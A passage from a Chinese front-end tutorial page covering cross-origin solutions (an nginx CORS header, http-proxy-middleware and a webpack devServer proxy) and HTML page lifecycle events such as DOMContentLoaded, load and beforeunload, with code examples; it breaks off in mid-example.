100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>。</p> <ul><li>下载后解压到一个文件夹中</li> <li>双击 <code>nginx.exe</code> 启动（此时可以通过 <a href="http://localhost/" target="_blank" rel="noopener noreferrer">http://localhost<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 访问 <code>nginx</code> 服务）</li> <li>在目录新建 <code>json</code> 文件夹</li> <li>进入 <code>json</code> 文件夹新建 <code>data.json</code> 文件并写入内容</li> <li>回到 <code>nginx</code> 根目录进入 <code>conf</code> 文件夹</li> <li>使用编辑器打开 <code>nginx.conf</code> 进行配置</li></ul> <p><strong>data.json 文件：</strong></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>{
+    &quot;name&quot;: &quot;nginx&quot;
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><strong>nginx.conf 文件：</strong></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>server {
+    .
+    .
+    .
+    location ~.*\.json {
+        root json;
+        add_header &quot;Access-Control-Allow-Origin&quot; &quot;*&quot;;
+    }
+    .
+    .
+    .
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p><strong>含义：</strong></p> <ul><li>~.*.json：代表忽略大小写，后缀名为 json 的文件；</li> <li>root json：代表 <code>json</code> 文件夹；</li> <li>add_header：代表加入跨域的响应头及允许访问的域，<code>*</code> 为允许任何访问。</li></ul> <p>在 <code>nginx</code> 根目录启动 <code>cmd</code> 命令行（windows 系统必须使用 <code>cmd</code> 命令行）执行下面代码重启 <code>nginx</code>。</p> <blockquote><p>nginx -s reload</p></blockquote> <p>不跨域访问：<a href="http://localhost/data.json" target="_blank" rel="noopener noreferrer">http://localhost/data.json<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>跨域访问时需要创建跨域条件代码如下：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>// 服务器
+const express = require(&quot;express&quot;);
+let app = express();
+
+app.use(express.static(__dirname));
+app.listen(3000);
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>跨域访问：<a href="http://localhost/" target="_blank" rel="noopener noreferrer">http://localhost<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>:3000/index.html</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>&lt;!-- 文件：index.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;nginx跨域&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;script&gt;
+        let xhr = new XMLHttpRequest();
+        xhr.open('GET', 'http://localhost/data.json', true);
+        xhr.onreadystatechange = function () {
+            if(xhr.readyState === 4) {
+                if(xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300 || xhr.status === 304) {
+                    console.log(xhr.response);
+                }
+            }
+        }
+        xhr.send();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><br> <h3 id="九、使用-http-proxy-middleware-实现跨域"><a href="#九、使用-http-proxy-middleware-实现跨域" aria-hidden="true" class="header-anchor">#</a> 九、使用 http-proxy-middleware 实现跨域</h3> <p>NodeJS 中间件 <code>http-proxy-middleware</code> 实现跨域代理，原理大致与 <code>nginx</code> 相同，都是通过启一个代理服务器，实现数据的转发，也可以通过设置 <code>cookieDomainRewrite</code> 参数修改响应头中 <code>cookie</code> 中的域名，实现当前域的 <code>cookie</code> 写入，方便接口登录认证。</p> <h4 id="_1、非-vue-框架的跨域（2-次跨域）"><a href="#_1、非-vue-框架的跨域（2-次跨域）" aria-hidden="true" class="header-anchor">#</a> 1、非 vue 框架的跨域（2 次跨域）</h4> <div class="language- line-numbers-mode"><pre class="language-text"><code>&lt;!-- 文件：index.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;proxy 跨域&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;script&gt;
+        var xhr = new XMLHttpRequest();
+
+        // 前端开关：浏览器是否读写 cookie
+        xhr.withCredentials = true;
+
+        // 访问 http-proxy-middleware 代理服务器
+        xhr.open('get', 'http://www.proxy1.com:3000/login?user=admin', true);
+        xhr.send();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>中间代理服务中使用了 <code>http-proxy-middleware</code> 中间件，因此需要提前下载：</p> <blockquote><p>npm install http-proxy-middleware --save-dev</p></blockquote> <div class="language- line-numbers-mode"><pre class="language-text"><code>// 中间代理服务器
+const express = require(&quot;express&quot;);
+let proxy = require(&quot;http-proxy-middleware&quot;);
+let app = express();
+
+app.use(
+    &quot;/&quot;,
+    proxy({
+        // 代理跨域目标接口
+        target: &quot;http://www.proxy2.com:8080&quot;,
+        changeOrigin: true,
+
+        // 修改响应头信息，实现跨域并允许带 cookie
+        onProxyRes: function(proxyRes, req, res) {
+            res.header(&quot;Access-Control-Allow-Origin&quot;, &quot;http://www.proxy1.com&quot;);
+            res.header(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);
+        },
+
+        // 修改响应信息中的 cookie 域名
+        cookieDomainRewrite: &quot;www.proxy1.com&quot; // 可以为 false，表示不修改
+    })
+);
+
+app.listen(3000);
+// 服务器
+const http = require(&quot;http&quot;);
+const qs = require(&quot;querystring&quot;);
+
+const server = http.createServer();
+
+server.on(&quot;request&quot;, function(req, res) {
+    let params = qs.parse(req.url.substring(2));
+
+    // 向前台写 cookie
+    res.writeHead(200, {
+        &quot;Set-Cookie&quot;: &quot;l=a123456;Path=/;Domain=www.proxy2.com;HttpOnly&quot; // HttpOnly：脚本无法读取
+    });
+
+    res.write(JSON.stringify(params));
+    res.end();
+});
+
+server.listen(&quot;8080&quot;);
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br></div></div><h4 id="_2、vue-框架的跨域（1-次跨域）"><a href="#_2、vue-框架的跨域（1-次跨域）" aria-hidden="true" class="header-anchor">#</a> 2、vue 框架的跨域（1 次跨域）</h4> <p>利用 <strong>node + webpack + webpack-dev-server</strong> 代理接口跨域。在开发环境下，由于 <code>Vue</code> 渲染服务和接口代理服务都是 <code>webpack-dev-server</code>，所以页面与代理接口之间不再跨域，无须设置 <code>Headers</code> 跨域信息了。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>// 导出服务器配置
+module.exports = {
+    entry: {},
+    module: {},
+    ...
+    devServer: {
+        historyApiFallback: true,
+        proxy: [{
+            context: '/login',
+            target: 'http://www.proxy2.com:8080',  // 代理跨域目标接口
+            changeOrigin: true,
+            secure: false,  // 当代理某些 https 服务报错时用
+            cookieDomainRewrite: 'www.domain1.com'  // 可以为 false，表示不修改
+        }],
+        noInfo: true
+    }
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>本篇文章在于帮助我们理解跨域，以及不同跨域方式的基本原理，在公司的项目比较多，多个域使用同一个服务器或者数据，以及在开发环境时，跨域的情况基本无法避免，一般会有各种各样形式的跨域解决方案，但其根本原理基本都在上面的跨域方式当中方式，我们可以根据开发场景不同，选择最合适的跨域解决方案。</p> <h2 id="浏览器存储"><a href="#浏览器存储" aria-hidden="true" class="header-anchor">#</a> 浏览器存储</h2> <h2 id="页面生命周期：domcontentloaded、load、beforeunload-和-unload"><a href="#页面生命周期：domcontentloaded、load、beforeunload-和-unload" aria-hidden="true" class="header-anchor">#</a> 页面生命周期：DOMContentLoaded、load、beforeunload 和 unload</h2> <p>HTML 页面的生命周期有三个重要事件：</p> <ul><li><code>DOMContentLoaded</code> —— 浏览器加载 HTML，并构建 DOM 树，但像 <code>&lt;img&gt;</code> 和样式这样的资源可能还没有加载。</li> <li><code>load</code> —— 浏览器加载所有资源（图像，样式等）。</li> <li><code>beforeunload/unload</code> —— 当用户离开页面时。</li></ul> <p>每个事件都是有用的：</p> <ul><li><code>DOMContentLoaded</code> 事件 —— DOM 已经准备好，因此处理器可以查找 DOM 节点，并初始化接口。</li> <li><code>load</code> 事件 —— 额外资源被加载后，我们可以获取图像大小（如果在 HTML/CSS 中没有指定）等。</li> <li><code>beforeunload/unload</code> 事件 —— 用户即将离开：我们可以检查用户是否保存了修改，并在询问他是否真的要离开。</li></ul> <p>我们探讨一下这些事件的细节。</p> <h2 id="domcontentloaded"><a href="#domcontentloaded" aria-hidden="true" class="header-anchor">#</a> <a href="https://zh.javascript.info/onload-ondomcontentloaded#domcontentloaded" target="_blank" rel="noopener noreferrer">DOMContentLoaded<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></h2> <p><code>DOMContentLoaded</code> 事件发生在 <code>document</code> 对象上。</p> <p>我们必须使用 <code>addEventListener</code> 来监听它：</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&quot;DOMContentLoaded&quot;</span><span class="token punctuation">,</span> ready<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>例如：</p> <div class="language-markup line-numbers-mode"><pre class="language-markup"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript">
+  <span class="token keyword">function</span> <span class="token function">ready</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'DOM is ready'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 图像尚未加载（除非已经有了缓存）因此大小是 0x0</span>
+    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`Image size: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>img<span class="token punctuation">.</span>offsetWidth<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">x</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>img<span class="token punctuation">.</span>offsetHeight<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+
+  document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&quot;DOMContentLoaded&quot;</span><span class="token punctuation">,</span> ready<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>img<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>https://en.js.cx/clipart/train.gif?speed=1&amp;cache=0<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><iframe name="frame-0.575953615702014" class="code-result__iframe" style="display:block;border:0px;width:531.354px;height:200px;"></iframe> <p>在示例中，<code>DOMContentLoaded</code> 处理器在文档加载时运行，而不是等到页面被加载时运行。因此 <code>alert</code> 显示大小为零。</p> <p>初识 <code>DOMContentLoaded</code> 事件时，觉得它比较简单。DOM 树已经准备好了 —— 这是事件。但却没有什么特别之处。</p> <h3 id="domcontentloaded-和脚本"><a href="#domcontentloaded-和脚本" aria-hidden="true" class="header-anchor">#</a> <a href="https://zh.javascript.info/onload-ondomcontentloaded#domcontentloaded-he-jiao-ben" target="_blank" rel="noopener noreferrer">DOMContentLoaded 和脚本<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></h3> <p>当浏览器开始加载 HTML 并在文本中遇到 <code>&lt;script&gt;...&lt;/script&gt;</code> 时，就会停止构建 DOM。它必须立即执行脚本。因此 <code>DOMContentLoaded</code> 只有在所有此类脚本被执行后才会发生。</p> <p>额外的脚本（带有 <code>src</code>）也会促使 DOM 构建在加载和执行过程时暂停。因此 <code>DOMContentLoaded</code> 也会等待外部脚本。</p> <p>唯一的例外是具有 <code>async</code> 和 <code>defer</code> 属性的外部脚本。它们告诉浏览器可以继续解析文档而不必等待脚本解析和执行。因此用户可以在脚本完成加载之前就看到页面，这对性能来说是有好处的。</p> <p><strong>A word about <code>async</code> and <code>defer</code></strong></p> <p>属性 <code>async</code>和 <code>defer</code> 仅适用于外部脚本。如果没有 <code>src</code>，它们就会被忽略。</p> <p>这两种方法告诉浏览器，它可以继续解析页面，并“在后台”继续加载脚本，然后在外部脚本加载完成后执行它。因此脚本不会阻塞 DOM 的构建和页面的渲染。</p> <p>他们之间有两个不同之处。</p> <table><thead><tr><th></th> <th><code>async</code></th> <th><code>defer</code></th></tr></thead> <tbody><tr><td>Order</td> <td>具有 <code>async</code> 的脚本以<strong>第一顺序被加载</strong>。它们的文档顺序并不重要 —— 先加载先运行。</td> <td>具有 <code>defer</code> 的脚本总是按照<strong>文档顺序</strong>来执行（就像它们在文档中那样）。</td></tr> <tr><td><code>DOMContentLoaded</code></td> <td>具有 <code>async</code> 的脚本可以在文档尚未完全下载时加载和执行。如果脚本较小或被缓存，而且文档足够长，就会发生这种情况。</td> <td>在 <code>DOMContentLoaded</code>之前，具有 <code>defer</code> 的脚本会在文档被加载并解析后执行（如果需要，它们会等待）。</td></tr></tbody></table> <p>因此 <code>async</code> 用于完全独立的脚本。</p> <h3 id="domcontentloaded-和样式"><a href="#domcontentloaded-和样式" aria-hidden="true" class="header-anchor">#</a> <a href="https://zh.javascript.info/onload-ondomcontentloaded#domcontentloaded-he-yang-shi" target="_blank" rel="noopener noreferrer">DOMContentLoaded 和样式<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></h3> <p>外部样式不会影响 DOM，因此 <code>DOMContentLoaded</code> 无需等待它们。</p> <p>但有一个陷阱：如果在样式之后有一个脚本，那么该脚本必须等待样式被执行：</p> <div class="language-markup line-numbers-mode"><pre class="language-markup"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>text/css<span class="token punctuation">&quot;</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>stylesheet<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>style.css<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript">
+  <span class="token comment">// the script doesn't not execute until the stylesheet is loaded</span>
+  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">getComputedStyle</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">.</span>marginTop<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>原因是脚本可能希望获取如上述示例所描述的元素坐标和其他与样式相关的属性。当然，它必须等待样式被加载。</p> <p>当 <code>DOMContentLoaded</code> 等待脚本时，它也在等待它们之前的样式。</p> <h3 id="浏览器内置填写"><a href="#浏览器内置填写" aria-hidden="true" class="header-anchor">#</a> <a href="https://zh.javascript.info/onload-ondomcontentloaded#liu-lan-qi-nei-zhi-tian-xie" target="_blank" rel="noopener noreferrer">浏览器内置填写<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></h3> <p>Firefox、Chrome 和 Opera 都会在 <code>DOMContentLoaded</code> 中自动填写表单。</p> <p>比如，如果页面有一个带有登录和密码的表单，并且浏览器记住了这些值，那么在 <code>DOMContentLoaded</code> 上，它就可以尝试自动填写它们（如果用户允许）。</p> <p>因此如果 <code>DOMContentLoaded</code> 被长加载脚本延迟，那么自动填写也在等待。你可能在某些站点上（如果你使用浏览器自动填写）—— 登录/密码字段将不会立即自动填写，在页面被完全加载前会出现延迟。这实际上是延迟到 <code>DOMContentLoaded</code> 事件。</p> <p>为外部脚本使用 <code>async</code> 和 <code>defer</code> 的一个好处是 —— 它们不会阻塞 <code>DOMContentLoaded</code>，而且也不会延迟浏览器的自动填写。</p> <h2 id="window-onload"><a href="#window-onload" aria-hidden="true" class="header-anchor">#</a> <a href="https://zh.javascript.info/onload-ondomcontentloaded#window-onload" target="_blank" rel="noopener noreferrer">window.onload<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></h2> <p>当包括样式、图像和其他资源的页面被全部加载时，<code>load</code> 事件就会在 <code>window</code> 对象上被触发。</p> <p>以下示例正确地显示了图像大小，因为 <code>window.onload</code> 等待了所有的图像：</p> <div class="language-markup line-numbers-mode"><pre class="language-markup"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript">
+  window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'Page loaded'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// image is loaded at this time</span>
+    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`Image size: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>img<span class="token punctuation">.</span>offsetWidth<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">x</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>img<span class="token punctuation">.</span>offsetHeight<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span class="token punctuation">;</span>
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>img<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>https://en.js.cx/clipart/train.gif?speed=1&amp;cache=0<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h2 id="window-onunload"><a href="#window-onunload" aria-hidden="true" class="header-anchor">#</a> <a href="https://zh.javascript.info/onload-ondomcontentloaded#windowonunload" target="_blank" rel="noopener noreferrer">window.onunload<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></h2> <p>当访问者离开页面时，<code>unload</code> 事件会在 <code>window</code> 上被触发。我们可以在那里做一些不涉及延迟的事件，比如关闭相关的弹出窗口。但我们不能取消跳转到另一个页面的事件。</p> <p>因此我们需要使用另一个事件 —— <code>onbeforeunload</code>。</p> <h2 id="window-onbeforeunload"><a href="#window-onbeforeunload" aria-hidden="true" class="header-anchor">#</a> <a href="https://zh.javascript.info/onload-ondomcontentloaded#window.onbeforeunload" target="_blank" rel="noopener noreferrer">window.onbeforeunload<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></h2> <p>如果访问中启动了离开页面的导航或试图关闭窗口，<code>beforeunload</code> 处理器将要求提供更多的确认。</p> <p>它可能会返回一个带有问题的字符串。从历史上看，浏览器通常会显示它，但到目前为止，只有一些浏览器这样做。这是因为某些站长滥用了这个事件处理器，显示了误导和恶意的信息。</p> <p>你可以通过运行这段代码，然后重新加载页面来进行尝试。</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function-variable function">onbeforeunload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">return</span> <span class="token string">&quot;There are unsaved changes. Leave now?&quot;</span><span class="token punctuation">;</span>
